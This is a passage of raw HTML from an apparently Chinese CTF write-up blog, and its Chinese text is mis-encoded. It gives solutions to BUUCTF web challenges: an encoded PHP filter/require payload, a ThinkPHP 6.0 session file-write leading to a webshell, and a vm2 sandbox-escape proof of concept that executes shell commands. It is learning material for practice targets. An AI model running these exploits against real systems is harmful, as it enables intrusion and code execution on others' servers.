</span></span><span class="line"><span class="cl"><span class="err">ç”¨</span><span class="n">require</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="o">%</span><span class="mi">8</span><span class="n">f</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="mi">8</span><span class="n">f</span><span class="o">%</span><span class="n">c5</span><span class="o">%</span><span class="n">d0</span><span class="o">%</span><span class="n">d0</span><span class="o">%</span><span class="mi">99</span><span class="o">%</span><span class="mi">96</span><span class="o">%</span><span class="mi">93</span><span class="o">%</span><span class="mi">8</span><span class="n">b</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="n">d0</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">9</span><span class="n">e</span><span class="o">%</span><span class="mi">9</span><span class="n">b</span><span class="o">%</span><span class="n">c2</span><span class="o">%</span><span class="mi">9</span><span class="n">c</span><span class="o">%</span><span class="mi">90</span><span class="o">%</span><span class="mi">91</span><span class="o">%</span><span class="mi">89</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="mi">8</span><span class="n">b</span><span class="o">%</span><span class="n">d1</span><span class="o">%</span><span class="mi">9</span><span class="n">d</span><span class="o">%</span><span class="mi">9</span><span class="n">e</span><span class="o">%</span><span class="mi">8</span><span class="n">c</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="n">c9</span><span class="o">%</span><span class="n">cb</span><span class="o">%</span><span class="n">d2</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">91</span><span class="o">%</span><span class="mi">9</span><span class="n">c</span><span class="o">%</span><span class="mi">90</span><span class="o">%</span><span class="mi">9</span><span class="n">b</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="n">d0</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">8</span><span class="n">c</span><span class="o">%</span><span class="mi">90</span><span class="o">%</span><span class="mi">8</span><span class="n">a</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="mi">9</span><span class="n">c</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="n">c2</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">9</span><span class="n">e</span><span class="o">%</span><span class="n">ce</span><span class="o">%</span><span class="mi">99</span><span class="o">%</span><span class="mi">93</span><span class="o">%</span><span class="n">cb</span><span class="o">%</span><span class="mi">98</span><span class="o">%</span><span class="n">d1</span><span class="o">%</span><span class="mi">8</span><span class="n">f</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="mi">8</span><span class="n">f</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="err">æ›¿æ¢åˆšæ‰çš„</span><span class="n">var_dump</span><span class="p">(</span><span class="n">get_defined_vars</span><span class="p">())</span><span class="err">è¢«ç¼–ç çš„éƒ¨åˆ†å³å¯ã€‚</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ€ç»ˆpayload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">//</span> <span class="n">GET</span>
</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="n">debu</span><span class="o">=</span><span class="n">aqua_is_cute</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">&amp;</span><span class="n">file</span><span class="o">=</span><span class="n">data</span><span class="p">:</span><span class="o">//</span><span class="n">text</span><span class="o">/</span><span class="n">plain</span><span class="p">,</span><span class="n">debu_debu_aqua</span><span class="o">&amp;</span><span class="n">shana</span><span class="p">[]</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">passwd</span><span class="p">[]</span><span class="o">=</span><span class="mi">2</span><span class="o">&amp;</span><span class="n">flag</span><span class="p">[</span><span class="n">arg</span><span class="p">]</span><span class="o">=</span><span class="p">};</span><span class="n">require</span><span class="p">(</span><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="n">filter</span><span class="o">/</span><span class="n">read</span><span class="o">=</span><span class="nb">convert</span><span class="o">.</span><span class="n">base64</span><span class="o">-</span><span class="n">encode</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="n">rea1fl4g</span><span class="o">.</span><span class="n">php</span><span class="p">);</span><span class="n">var_dump</span><span class="p">(</span><span class="n">get_defined_vars</span><span class="p">());</span><span class="o">//&amp;</span><span class="n">flag</span><span class="p">[</span><span class="n">code</span><span class="p">]</span><span class="o">=</span><span class="n">create_function</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">62</span><span class="o">%</span><span class="mi">75</span><span class="o">=%</span><span class="mi">61</span><span class="o">%</span><span class="mi">71</span><span class="o">%</span><span class="mi">75</span><span class="o">%</span><span class="mi">61</span><span class="n">_is_</span><span class="o">%</span><span class="mi">63</span><span class="o">%</span><span class="mi">75</span><span class="o">%</span><span class="mi">74</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">&amp;</span><span class="n">file</span><span class="o">=</span><span class="n">data</span><span class="p">:</span><span class="o">//</span><span class="n">text</span><span class="o">/</span><span class="n">plain</span><span class="p">,</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">62</span><span class="o">%</span><span class="mi">75</span><span class="n">_</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">62</span><span class="o">%</span><span class="mi">75</span><span class="n">_</span><span class="o">%</span><span class="mi">61</span><span class="o">%</span><span class="mi">71</span><span class="o">%</span><span class="mi">75</span><span class="o">%</span><span class="mi">61</span><span class="o">&amp;%</span><span class="mi">73</span><span class="o">%</span><span class="mi">68</span><span class="o">%</span><span class="mi">61</span><span class="o">%</span><span class="mi">6</span><span class="n">e</span><span class="o">%</span><span class="mi">61</span><span class="p">[]</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;%</span><span class="mi">70</span><span class="o">%</span><span class="mi">61</span><span class="o">%</span><span class="mi">73</span><span class="o">%</span><span class="mi">73</span><span class="o">%</span><span class="mi">77</span><span class="o">%</span><span class="mi">64</span><span class="p">[]</span><span class="o">=</span><span class="mi">2</span><span class="o">&amp;%</span><span class="mi">66</span><span class="o">%</span><span class="mi">6</span><span class="n">c</span><span class="o">%</span><span class="mi">61</span><span class="o">%</span><span class="mi">67</span><span class="p">[</span><span class="o">%</span><span class="mi">61</span><span class="o">%</span><span class="mi">72</span><span class="o">%</span><span class="mi">67</span><span class="p">]</span><span class="o">=</span><span class="p">;}</span><span class="n">require</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="o">%</span><span class="mi">8</span><span class="n">f</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="mi">8</span><span class="n">f</span><span class="o">%</span><span class="n">c5</span><span class="o">%</span><span class="n">d0</span><span class="o">%</span><span class="n">d0</span><span class="o">%</span><span class="mi">99</span><span class="o">%</span><span class="mi">96</span><span class="o">%</span><span class="mi">93</span><span class="o">%</span><span class="mi">8</span><span class="n">b</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="n">d0</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">9</span><span class="n">e</span><span class="o">%</span><span class="mi">9</span><span class="n">b</span><span class="o">%</span><span class="n">c2</span><span class="o">%</span><span class="mi">9</span><span class="n">c</span><span class="o">%</span><span class="mi">90</span><span class="o">%</span><span class="mi">91</span><span class="o">%</span><span class="mi">89</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="mi">8</span><span class="n">b</span><span class="o">%</span><span class="n">d1</span><span class="o">%</span><span class="mi">9</span><span class="n">d</span><span class="o">%</span><span class="mi">9</span><span class="n">e</span><span class="o">%</span><span class="mi">8</span><span class="n">c</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="n">c9</span><span class="o">%</span><span class="n">cb</span><span class="o">%</span><span class="n">d2</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">91</span><span class="o">%</span><span class="mi">9</span><span class="n">c</span><span class="o">%</span><span class="mi">90</span><span class="o">%</span><span class="mi">9</span><span class="n">b</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="n">d0</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">8</span><span class="n">c</span><span class="o">%</span><span class="mi">90</span><span class="o">%</span><span class="mi">8</span><span class="n">a</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="mi">9</span><span class="n">c</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="n">c2</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">9</span><span class="n">e</span><span class="o">%</span><span class="n">ce</span><span class="o">%</span><span class="mi">99</span><span class="o">%</span><span class="mi">93</span><span class="o">%</span><span class="n">cb</span><span class="o">%</span><span class="mi">98</span><span class="o">%</span><span class="n">d1</span><span class="o">%</span><span class="mi">8</span><span class="n">f</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="mi">8</span><span class="n">f</span><span class="p">));</span><span class="o">//&amp;%</span><span class="mi">66</span><span class="o">%</span><span class="mi">6</span><span class="n">c</span><span class="o">%</span><span class="mi">61</span><span class="o">%</span><span class="mi">67</span><span class="p">[</span><span class="o">%</span><span class="mi">63</span><span class="o">%</span><span class="mi">6</span><span class="n">f</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">65</span><span class="p">]</span><span class="o">=</span><span class="n">create_function</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="n">POST</span>
</span></span><span class="line"><span class="cl"><span class="n">debu</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">file</span><span class="o">=</span><span class="mi">1</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="gyctf2020easythinking">[GYCTF2020]EasyThinking
</h2><p>åˆ©ç”¨thinkphp6.0å¾€sessionè¿›è¡Œä»»æ„æ–‡ä»¶å†™å…¥çš„æ¼æ´</p>
<p>æ„é€ PHPSESSIDçš„å€¼ï¼Œæ”¹å€¼<strong>é•¿åº¦ä¸º32</strong>ä¸”ä¸ºstringå‹ï¼Œç„¶åå°±ä¼šåœ¨/runtime/session/ç›®å½•ä¸‹äº§ç”Ÿä¸€ä¸ªphpæ–‡ä»¶</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405201547619.png"
	width="925"
	height="692"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405201547619_hu14284129253457604317.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250405201547619_hu14824927213479857781.png 1024w"
	loading="lazy"
	
		alt="image-20250405201547619"
	
	
		class="gallery-image" 
		data-flex-grow="133"
		data-flex-basis="320px"
	
></p>
<p>ç„¶åè®¿é—®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/runtime/session/sess_1111111111111111111111111111.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>èšå‰‘è¿æ¥ï¼Œæ’ä»¶ç»•è¿‡</p>
<h2 id="gxyctf2019strongestmind">[GXYCTF2019]StrongestMind
</h2><p>çˆ¬è™«</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://8131dc42-f253-4d5f-b190-58956c615ca6.node5.buuoj.cn:81/&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">req</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1010</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">&#34;\&lt;br\&gt;\&lt;br\&gt;(\d.*?)\&lt;br\&gt;\&lt;br\&gt;&#34;</span><span class="p">,</span><span class="n">req</span><span class="p">)</span><span class="c1">#è·å–[æ•°å­—]</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">result</span><span class="p">)</span><span class="c1">#æå–å­—ç¬¦ä¸²</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">result</span><span class="p">)</span><span class="c1">#è¿ç®—</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;time: &#34;</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span><span class="s2">&#34;   &#34;</span><span class="o">+</span><span class="s2">&#34;result: &#34;</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">result</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;answer&#34;</span><span class="p">:</span><span class="n">result</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">req</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;flag{&#34;</span> <span class="ow">in</span> <span class="n">req</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;flag{.*}&#34;</span><span class="p">,</span> <span class="n">req</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">0</span><span class="p">)[:</span><span class="mi">50</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span><span class="c1">#é˜²æ­¢è®¿é—®å¤ªå¿«æ–­å¼€è¿æ¥</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-]&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="hfctf2020justescape">[HFCTF2020]JustEscape
</h2><p>æ‰“å¼€ç•Œé¢æœ‰run.php</p>
<p>ä¸‹é¢åˆè¯´çœŸçš„æ˜¯phpå—</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span> <span class="nx">array_key_exists</span><span class="p">(</span> <span class="s2">&#34;code&#34;</span><span class="p">,</span> <span class="nv">$_GET</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;code&#39;</span> <span class="p">]</span> <span class="o">!=</span> <span class="k">NULL</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$code</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="k">eval</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è€ƒè™‘åˆ°evalå‡½æ•°ä¸æ­¢phpæœ‰ï¼Œnodejsä¹Ÿæœ‰</p>
<p>ç”¨<code>Error().stack</code>çœ‹æŠ¥é”™ä¿¡æ¯</p>
<p><a class="link" href="https://www.bookstack.cn/read/node-in-debugging/3.3ErrorStack.md"  target="_blank" rel="noopener"
    >ä»£ç ç¯‡ - Error Stack - ã€ŠNode.js è°ƒè¯•æŒ‡å—ã€‹ - ä¹¦æ ˆç½‘ Â· BookStack</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">run.php?code=Error().stack
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nb">Error</span>
</span></span><span class="line"><span class="cl">    <span class="nx">at</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="nx">at</span> <span class="nx">Script</span><span class="p">.</span><span class="nx">runInContext</span> <span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">131</span><span class="o">:</span><span class="mi">20</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">at</span> <span class="nx">VM</span><span class="p">.</span><span class="nx">run</span> <span class="p">(</span><span class="err">/app/node_modules/vm2/lib/main.js:219:62)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">at</span> <span class="o">/</span><span class="nx">app</span><span class="o">/</span><span class="nx">server</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">51</span><span class="o">:</span><span class="mi">33</span>
</span></span><span class="line"><span class="cl">    <span class="nx">at</span> <span class="nx">Layer</span><span class="p">.</span><span class="nx">handle</span> <span class="p">[</span><span class="nx">as</span> <span class="nx">handle_request</span><span class="p">]</span> <span class="p">(</span><span class="err">/app/node_modules/express/lib/router/layer.js:95:5)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">at</span> <span class="nx">next</span> <span class="p">(</span><span class="err">/app/node_modules/express/lib/router/route.js:137:13)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">at</span> <span class="nx">Route</span><span class="p">.</span><span class="nx">dispatch</span> <span class="p">(</span><span class="err">/app/node_modules/express/lib/router/route.js:112:3)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">at</span> <span class="nx">Layer</span><span class="p">.</span><span class="nx">handle</span> <span class="p">[</span><span class="nx">as</span> <span class="nx">handle_request</span><span class="p">]</span> <span class="p">(</span><span class="err">/app/node_modules/express/lib/router/layer.js:95:5)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">at</span> <span class="o">/</span><span class="nx">app</span><span class="o">/</span><span class="nx">node_modules</span><span class="o">/</span><span class="nx">express</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">router</span><span class="o">/</span><span class="nx">index</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">281</span><span class="o">:</span><span class="mi">22</span>
</span></span><span class="line"><span class="cl">    <span class="nx">at</span> <span class="nb">Function</span><span class="p">.</span><span class="nx">process_params</span> <span class="p">(</span><span class="err">/app/node_modules/express/lib/router/index.js:335:12)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>vmæ²™ç®±é€ƒé€¸</p>
<p>ç”¨githubæœ‰ç°æˆçš„poc</p>
<p><a class="link" href="https://github.com/patriksimek/vm2/issues/225"  target="_blank" rel="noopener"
    >Breakout in v3.8.3 Â· Issue #225 Â· patriksimek/vm2</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">One</span> <span class="nx">can</span> <span class="k">break</span> <span class="nx">out</span> <span class="k">of</span> <span class="nx">the</span> <span class="nx">sandbox</span> <span class="nx">via</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s2">&#34;use strict&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm2&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">untrusted</span> <span class="o">=</span> <span class="s1">&#39;(&#39;</span> <span class="o">+</span> <span class="kd">function</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">	<span class="nx">TypeError</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">get_process</span> <span class="o">=</span> <span class="nx">f</span><span class="p">=&gt;</span><span class="nx">f</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s2">&#34;return process&#34;</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">	<span class="k">try</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nb">Object</span><span class="p">.</span><span class="nx">preventExtensions</span><span class="p">(</span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)).</span><span class="nx">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">e</span><span class="p">.</span><span class="nx">get_process</span><span class="p">(()=&gt;{}).</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="o">+</span><span class="s1">&#39;)()&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">new</span> <span class="nx">VM</span><span class="p">().</span><span class="nx">run</span><span class="p">(</span><span class="nx">untrusted</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">x</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">And</span> <span class="nx">another</span> <span class="nx">more</span> <span class="nx">game</span> <span class="nx">breaking</span> <span class="nx">one</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s2">&#34;use strict&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm2&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">untrusted</span> <span class="o">=</span> <span class="s1">&#39;(&#39;</span> <span class="o">+</span> <span class="kd">function</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">	<span class="k">try</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="k">new</span> <span class="nb">Proxy</span><span class="p">({},</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nx">getOwnPropertyDescriptor</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">				<span class="k">throw</span> <span class="nx">f</span><span class="p">=&gt;</span><span class="nx">f</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s2">&#34;return process&#34;</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="p">}));</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
